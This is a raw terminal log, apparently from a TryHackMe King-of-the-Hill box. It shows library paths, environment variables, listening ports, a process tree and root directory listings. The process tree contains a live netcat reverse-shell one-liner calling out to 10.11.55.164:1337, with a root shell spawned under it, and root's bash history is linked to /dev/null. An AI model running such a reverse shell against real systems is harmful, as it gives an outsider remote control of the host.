r/lib/x86_64-linux-gnu/libnsl.so.libnpth.so.0./usr/lib/x86_64-linux-gnu/libnpth.so.0.libnl-3.so.200./lib/x86_64-linux-gnu/libnl-3.so.200.libnl-genl-3.so.200./lib/x86_64-linux-gnu/libnl-genl-3.so.200.libnih.so.1./lib/x86_64-linux-gnu/libnih.so.1.libnghttp2.so.14./usr/lib/x86_64-linux-gnu/libnghttp2.so.14.libnfnetlink.so.0./usr/lib/x86_64-linux-gnu/libnfnetlink.so.0.libnewt.so.0.52./lib/x86_64-linux-gnu/libnewt.so.0.52.libnettle.so.6./usr/lib/x86_64-linux-gnu/libnettle.so.6.libnetfilter_conntrack.so.3./usr/lib/x86_64-linux-gnu/libnetfilter_conntrack.so.3.libncursesw.so.5./lib/x86_64-linux-gnu/libncursesw.so.5.libncurses.so.5./lib/x86_64-linux-gnu/libncurses.so.5.libmvec.so.1./lib/x86_64-linux-gnu/libmvec.so.1.libmvec.so./usr/lib/x86_64-linux-gnu/libmvec.so.libmspack.so.0./usr/lib/x86_64-linux-gnu/libmspack.so.0.libmpxwrappers.so.2./usr/lib/x86_64-linux-gnu/libmpxwrappers.so.2.libmpx.so.2./usr/lib/x86_64-linux-gnu/libmpx.so.2.libmpfr.so.6./usr/lib/x86_64-linux-gnu/libmpfr.so.6.libmpdec.so.2./usr/lib/x86_64-linux-gnu/libmpdec.so.2.libmpc.so.3./usr/lib/x86_64-linux-gnu/libmpc.so.3.libmount.so.1./lib/x86_64-linux-gnu/libmount.so.1.libmnl.so.0./lib/x86_64-linux-gnu/libmnl.so.0.libmenuw.so.5./usr/lib/x86_64-linux-gnu/libmenuw.so.5.libmenu.so.5./usr/lib/x86_64-linux-gnu/libmenu.so.5.libmenu.so./usr/lib/x86_64-linux-gnu/libmenu.so.libmemusage.so./lib/x86_64-linux-gnu/libmemusage.so.libmagic.so.1./usr/lib/x86_64-linux-gnu/libmagic.so.1.libm.so.6./lib/x86_64-linux-gnu/libm.so.6.liblz4.so.1./usr/lib/x86_64-linux-gnu/liblz4.so.1.liblzo2.so.2./lib/x86_64-linux-gnu/liblzo2.so.2.liblzma.so.5./lib/x86_64-linux-gnu/liblzma.so.5.liblxc.so.1./usr/lib/x86_64-linux-gnu/liblxc.so.1.liblwres.so.160./usr/lib/x86_64-linux-gnu/liblwres.so.160.liblvm2cmd.so.2.02./lib/x86_64-linux-gnu/liblvm2cmd.so.2.02.liblvm2app.so.2.2./lib/x86_64-linux-gnu/liblvm2app.so.2.2.liblsan.so.0./usr/lib/x86_64-linux-gnu/liblsan.so.0.libldap_r-2.4.so.2./usr/lib/x86_64-linux-gnu/libldap_r-2.4.so.2.liblber-2.4.so.2./usr/lib/x86_64-linux-gnu/liblber-2.4.so.2.libk5crypto.so.3./usr/lib/x86_64-linux-gnu/libk5crypto.so.3.libksba.so.8./usr/lib/x86_64-linux-gnu/libksba.so.8.libkrb5support.so.0./usr/lib/x86_64-linux-gnu/libkrb5support.so.0.libkrb5.so.26./usr/lib/x86_64-linux-gnu/libkrb5.so.26.libkrb5.so.3./usr/lib/x86_64-linux-gnu/libkrb5.so.3.libkmod.so.2./lib/x86_64-linux-gnu/libkmod.so.2.libkeyutils.so.1./lib/x86_64-linux-gnu/libkeyutils.so.1.libjson-c.so.3./lib/x86_64-linux-gnu/libjson-c.so.3.libitm.so.1./usr/lib/x86_64-linux-gnu/libitm.so.1.libisns.so.0./usr/lib/x86_64-linux-gnu/libisns.so.0.libisns-nocrypto.so.0./lib/x86_64-linux-gnu/libisns-nocrypto.so.0.libisl.so.19./usr/lib/x86_64-linux-gnu/libisl.so.19.libisccfg.so.160./usr/lib/x86_64-linux-gnu/libisccfg.so.160.libisccc.so.160./usr/lib/x86_64-linux-gnu/libisccc.so.160.libisc.so.169./usr/lib/x86_64-linux-gnu/libisc.so.169.libisc-pkcs11.so.169./usr/lib/x86_64-linux-gnu/libisc-pkcs11.so.169.libisc-export.so.169./lib/x86_64-linux-gnu/libisc-export.so.169.libirs.so.160./usr/lib/x86_64-linux-gnu/libirs.so.160.libip6tc.so.0./usr/lib/x86_64-linux-gnu/libip6tc.so.0.libip4tc.so.0./usr/lib/x86_64-linux-gnu/libip4tc.so.0.libiptc.so.0./usr/lib/x86_64-linux-gnu/libiptc.so.0.libidn2.so.0./usr/lib/x86_64-linux-gnu/libidn2.so.0.libidn.so.11./lib/x86_64-linux-gnu/libidn.so.11.libicuuc.so.60./usr/lib/x86_64-linux-gnu/libicuuc.so.60.libicutu.so.60./usr/lib/x86_64-linux-gnu/libicutu.so.60.libicutest.so.60./usr/lib/x86_64-linux-gnu/libicutest.so.60.libicui18n.so.60./usr/lib/x86_64-linux-gnu/libicui18n.so.60.libicuio.so.60./usr/lib/x86_64-linux-gnu/libicuio.so.60.libicudata.so.60./usr/lib/x86_64-linux-gnu/libicudata.so.60.libhx509.so.5./usr/lib/x86_64-linux-gnu/libhx509.so.5.libhogweed.so.4./usr/lib/x86_64-linux-gnu/libhogweed.so.4.libhistory.so.7./lib/x86_64-linux-gnu/libhistory.so.7.libhistory.so.5./lib/x86_64-linux-gnu/libhistory.so.5.libhgfs.so.0./usr/lib/libhgfs.so.0.libheimntlm.so.0./usr/lib/x86_64-linux-gnu/libheimntlm.so.0.libheimbase.so.1./usr/lib/x86_64-linux-gnu/libheimbase.so.1.libhcrypto.so.4./usr/lib/x86_64-linux-gnu/libhcrypto.so.4.libhandle.so.1./lib/libhandle.so.1.libguestlib.so.0./usr/lib/libguestlib.so.0.libgthread-2.0.so.0./usr/lib/x86_64-linux-gnu/libgthread-2.0.so.0.libgssapi_krb5.so.2./usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.libgssapi.so.3./usr/lib/x86_64-linux-gnu/libgssapi.so.3.libgpm.so.2./usr/lib/x86_64-linux-gnu/libgpm.so.2.libgpg-error.so.0./lib/x86_64-linux-gnu/libgpg-error.so.0.libgomp.so.1./usr/lib/x86_64-linux-gnu/libgomp.so.1.libgobject-2.0.so.0./usr/lib/x86_64-linux-gnu/libgobject-2.0.so.0.libgnutls.so.30./usr/lib/x86_64-linux-gnu/libgnutls.so.30.libgmp.so.10./usr/lib/x86_64-linux-gnu/libgmp.so.10.libgmodule-2.0.so.0./usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0.libglib-2.0.so.0./usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.libgirepository-1.0.so.1./usr/lib/x86_64-linux-gnu/libgirepository-1.0.so.1.libgio-2.0.so.0./usr/lib/x86_64-linux-gnu/libgio-2.0.so.0.libgdbm_compat.so.4./usr/lib/x86_64-linux-gnu/libgdbm_compat.so.4.libgdbm.so.5./usr/lib/x86_64-linux-gnu/libgdbm.so.5.libgcrypt.so.20./lib/x86_64-linux-gnu/libgcrypt.so.20.libgcc_s.so.1./lib/x86_64-linux-gnu/libgcc_s.so.1.libfuse.so.2./lib/x86_64-linux-gnu/libfuse.so.2.libfribidi.so.0./usr/lib/x86_64-linux-gnu/libfribidi.so.0.libfreetype.so.6./usr/lib/x86_64-linux-gnu/libfreetype.so.6.libformw.so.5./usr/lib/x86_64-linux-gnu/libformw.so.5.libform.so.5./usr/lib/x86_64-linux-gnu/libform.so.5.libform.so./usr/lib/x86_64-linux-gnu/libform.so.libffi.so.6./usr/lib/x86_64-linux-gnu/libffi.so.6.libfdisk.so.1./lib/x86_64-linux-gnu/libfdisk.so.1.libfastjson.so.4./usr/lib/x86_64-linux-gnu/libfastjson.so.4.libfakeroot-0.so./usr/lib/x86_64-linux-gnu/libfakeroot/libfakeroot-0.so.libe2p.so.2./lib/x86_64-linux-gnu/libe2p.so.2.libext2fs.so.2./lib/x86_64-linux-gnu/libext2fs.so.2.libexslt.so.0./usr/lib/x86_64-linux-gnu/libexslt.so.0.libexpatw.so.1./usr/lib/x86_64-linux-gnu/libexpatw.so.1.libexpat.so.1./lib/x86_64-linux-gnu/libexpat.so.1.libevent_core-2.1.so.6./usr/lib/x86_64-linux-gnu/libevent_core-2.1.so.6.libevent-2.1.so.6./usr/lib/x86_64-linux-gnu/libevent-2.1.so.6.libestr.so.0./usr/lib/x86_64-linux-gnu/libestr.so.0.libelf.so.1./usr/lib/x86_64-linux-gnu/libelf.so.1.libedit.so.2./usr/lib/x86_64-linux-gnu/libedit.so.2.libeatmydata.so.1./usr/lib/x86_64-linux-gnu/libeatmydata.so.1.libeatmydata.so./usr/lib/x86_64-linux-gnu/libeatmydata.so.libdumbnet.so.1./usr/lib/x86_64-linux-gnu/libdumbnet.so.1.libdrm.so.2./usr/lib/x86_64-linux-gnu/libdrm.so.2.libdns.so.1100./usr/lib/x86_64-linux-gnu/libdns.so.1100.libdns-pkcs11.so.1100./usr/lib/x86_64-linux-gnu/libdns-pkcs11.so.1100.libdns-export.so.1100./lib/x86_64-linux-gnu/libdns-export.so.1100.libdl.so.2./lib/x86_64-linux-gnu/libdl.so.2.libdl.so./usr/lib/x86_64-linux-gnu/libdl.so.libdevmapper.so.1.02.1./lib/x86_64-linux-gnu/libdevmapper.so.1.02.1.libdevmapper-event.so.1.02.1./lib/x86_64-linux-gnu/libdevmapper-event.so.1.02.1.libdevmapper-event-lvm2thin.so./lib/x86_64-linux-gnu/libdevmapper-event-lvm2thin.so.libdevmapper-event-lvm2snapshot.so./lib/x86_64-linux-gnu/libdevmapper-event-lvm2snapshot.so.libdevmapper-event-lvm2raid.so./lib/x86_64-linux-gnu/libdevmapper-event-lvm2raid.so.libdevmapper-event-lvm2mirror.so./lib/x86_64-linux-gnu/libdevmapper-event-lvm2mirror.so.libdevmapper-event-lvm2.so.2.02./lib/x86_64-linux-gnu/libdevmapper-event-lvm2.so.2.02.libdebconfclient.so.0./usr/lib/x86_64-linux-gnu/libdebconfclient.so.0.libdbus-1.so.3./lib/x86_64-linux-gnu/libdbus-1.so.3.libdbus-glib-1.so.2./usr/lib/x86_64-linux-gnu/libdbus-glib-1.so.2.libdb-5.3.so./usr/lib/x86_64-linux-gnu/libdb-5.3.so.libcurl.so.4./usr/lib/x86_64-linux-gnu/libcurl.so.4.libcurl-gnutls.so.4./usr/lib/x86_64-linux-gnu/libcurl-gnutls.so.4.libcryptsetup.so.12./lib/x86_64-linux-gnu/libcryptsetup.so.12.libcrypto.so.1.1./usr/lib/x86_64-linux-gnu/libcrypto.so.1.1.libcrypto.so.1.0.0./usr/lib/x86_64-linux-gnu/libcrypto.so.1.0.0.libcrypt.so.1./lib/x86_64-linux-gnu/libcrypt.so.1.libcrypt.so./usr/lib/x86_64-linux-gnu/libcrypt.so.libcom_err.so.2./lib/x86_64-linux-gnu/libcom_err.so.2.libcilkrts.so.5./usr/lib/x86_64-linux-gnu/libcilkrts.so.5.libcidn.so.1./lib/x86_64-linux-gnu/libcidn.so.1.libcidn.so./usr/lib/x86_64-linux-gnu/libcidn.so.libcc1.so.0./usr/lib/x86_64-linux-gnu/libcc1.so.0.libcap.so.2./lib/x86_64-linux-gnu/libcap.so.2.libcap-ng.so.0./lib/x86_64-linux-gnu/libcap-ng.so.0.libc.so.6./lib/x86_64-linux-gnu/libc.so.6.libbz2.so.1.0./lib/x86_64-linux-gnu/libbz2.so.1.0.libbtrfs.so.0./usr/lib/x86_64-linux-gnu/libbtrfs.so.0.libbtrfs.so./usr/lib/x86_64-linux-gnu/libbtrfs.so.libbsd.so.0./lib/x86_64-linux-gnu/libbsd.so.0.libblkid.so.1./lib/x86_64-linux-gnu/libblkid.so.1.libbind9.so.160./usr/lib/x86_64-linux-gnu/libbind9.so.160.libbfd-2.30-system.so./usr/lib/x86_64-linux-gnu/libbfd-2.30-system.so.libaudit.so.1./lib/x86_64-linux-gnu/libaudit.so.1.libattr.so.1./lib/x86_64-linux-gnu/libattr.so.1.libatomic.so.1./usr/lib/x86_64-linux-gnu/libatomic.so.1.libatm.so.1./lib/x86_64-linux-gnu/libatm.so.1.libassuan.so.0./usr/lib/x86_64-linux-gnu/libassuan.so.0.libasn1.so.8./usr/lib/x86_64-linux-gnu/libasn1.so.8.libasan.so.4./usr/lib/x86_64-linux-gnu/libasan.so.4.libargon2.so.0./usr/lib/x86_64-linux-gnu/libargon2.so.0.libapt-private.so.0.0./usr/lib/x86_64-linux-gnu/libapt-private.so.0.0.libapt-pkg.so.5.0./usr/lib/x86_64-linux-gnu/libapt-pkg.so.5.0.libapt-inst.so.2.0./usr/lib/x86_64-linux-gnu/libapt-inst.so.2.0.libapparmor.so.1./lib/x86_64-linux-gnu/libapparmor.so.1.libanl.so.1./lib/x86_64-linux-gnu/libanl.so.1.libanl.so./usr/lib/x86_64-linux-gnu/libanl.so.libaio.so.1./lib/x86_64-linux-gnu/libaio.so.1.libacl.so.1./lib/x86_64-linux-gnu/libacl.so.1.libaccountsservice.so.0./usr/lib/x86_64-linux-gnu/libaccountsservice.so.0.libX11.so.6./usr/lib/x86_64-linux-gnu/libX11.so.6.libXmuu.so.1./usr/lib/x86_64-linux-gnu/libXmuu.so.1.libXext.so.6./usr/lib/x86_64-linux-gnu/libXext.so.6.libXdmcp.so.6./usr/lib/x86_64-linux-gnu/libXdmcp.so.6.libXau.so.6./usr/lib/x86_64-linux-gnu/libXau.so.6.libSegFault.so./lib/x86_64-linux-gnu/libSegFault.so.libGeoIP.so.1./usr/lib/x86_64-linux-gnu/libGeoIP.so.1.libDeployPkg.so.0./usr/lib/libDeployPkg.so.0.libBrokenLocale.so.1./lib/x86_64-linux-gnu/libBrokenLocale.so.1.libBrokenLocale.so./usr/lib/x86_64-linux-gnu/libBrokenLocale.so.ld-linux-x86-64.so.2./lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.

env
PWD=/etc
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
OLDPWD=/root

ss -tunlpd
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port                                                                                  
udp    UNCONN   0        0              127.0.0.53:53             0.0.0.0:*      users:(("systemd-resolve",pid=623,fd=12))                                      
udp    UNCONN   0        0            10.10.69.206:68             0.0.0.0:*      users:(("systemd-network",pid=610,fd=15))                                      
tcp    LISTEN   0        0              127.0.0.53:53             0.0.0.0:*      users:(("systemd-resolve",pid=623,fd=13))                                      
tcp    LISTEN   0        0                 0.0.0.0:22             0.0.0.0:*      users:(("sshd",pid=819,fd=3))                                                  
tcp    LISTEN   0        0                 0.0.0.0:46969          0.0.0.0:*      users:(("inetd",pid=751,fd=7))                                                 
tcp    LISTEN   0        0                 0.0.0.0:3306           0.0.0.0:*      users:(("mysqld",pid=841,fd=27))                                               
tcp    LISTEN   0        0                       *:9999                 *:*      users:(("koth",pid=789,fd=3))                                                  
tcp    LISTEN   0        0                       *:22                   *:*      users:(("sshd",pid=819,fd=4))                                                  
tcp    LISTEN   0        0                       *:15065                *:*      users:(("main",pid=745,fd=3))                                                  
tcp    LISTEN   0        0                       *:16109                *:*      users:(("img",pid=729,fd=3))                                                   
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17380 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:02 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3408 ?        S    23:00   0:00      |   \_ -i
root      4010  0.0  0.3  37080  3460 ?        R    23:04   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.4 106640  4080 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:07 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:11 /li
cd /lib
ls
apparmor
console-setup
cpp
crda
cryptsetup
ebtables
firmware
hdparm
init
klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
libhandle.so.1
libhandle.so.1.0.3
lsb
modprobe.d
modules
modules-load.d
netplan
open-iscsi
recovery-mode
systemd
terminfo
udev
ufw
x86_64-linux-gnu
ls -lah
total 212K
drwxr-xr-x 22 root root 4.0K Dec  8 22:34 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
cd /
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
ls -lah
total 1.9G
drwxr-xr-x  24 root root 4.0K Mar 19  2020 .
drwxr-xr-x  24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x   2 root root 4.0K Mar 20  2020 bin
drwxr-xr-x   3 root root 4.0K Mar 20  2020 boot
drwxr-xr-x   2 root root 4.0K Mar 19  2020 cdrom
drwxr-xr-x  17 root root 3.7K Dec  8 22:31 dev
drwxr-xr-x  95 root root 4.0K Dec  8 23:00 etc
drwxr-xr-x   8 root root 4.0K Dec  8 23:00 home
lrwxrwxrwx   1 root root   33 Mar 19  2020 initrd.img -> boot/initrd.img-4.15.0-91-generic
lrwxrwxrwx   1 root root   33 Mar 19  2020 initrd.img.old -> boot/initrd.img-4.15.0-91-generic
drwxr-xr-x  22 root root 4.0K Dec  8 22:34 lib
drwxr-xr-x   2 root root 4.0K Aug  5  2019 lib64
drwx------   2 root root  16K Mar 19  2020 lost+found
drwxr-xr-x   2 root root 4.0K Aug  5  2019 media
drwxr-xr-x   2 root root 4.0K Aug  5  2019 mnt
drwxr-xr-x   2 root root 4.0K Aug  5  2019 opt
dr-xr-xr-x 114 root root    0 Dec  8 22:31 proc
drwx------   4 root root 4.0K Dec  8 23:04 root
drwxr-xr-x  26 root root  880 Dec  8 22:32 run
drwxr-xr-x   2 root root  12K Mar 20  2020 sbin
drwxr-xr-x   4 root root 4.0K Mar 19  2020 snap
drwxr-xr-x   2 root root 4.0K Aug  5  2019 srv
-rw-------   1 root root 1.9G Mar 19  2020 swap.img
dr-xr-xr-x  13 root root    0 Dec  8 22:31 sys
drwxrwxrwt  10 root root 4.0K Dec  8 23:00 tmp
drwxr-xr-x  10 root root 4.0K Aug  5  2019 usr
drwxr-xr-x  13 root root 4.0K Dec  8 23:01 var
lrwxrwxrwx   1 root root   30 Mar 19  2020 vmlinuz -> boot/vmlinuz-4.15.0-91-generic
lrwxrwxrwx   1 root root   30 Mar 19  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-91-generic
cd /dev/shm
ls -la
total 0
drwxrwxrwt  2 root root   60 Dec  8 23:04 .
drwxr-xr-x 17 root root 3700 Dec  8 22:31 ..
cd
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:05 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
cd /lib64
ls
ld-linux-x86-64.so.2
ls -lah
total 8.0K
drwxr-xr-x  2 root root 4.0K Aug  5  2019 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
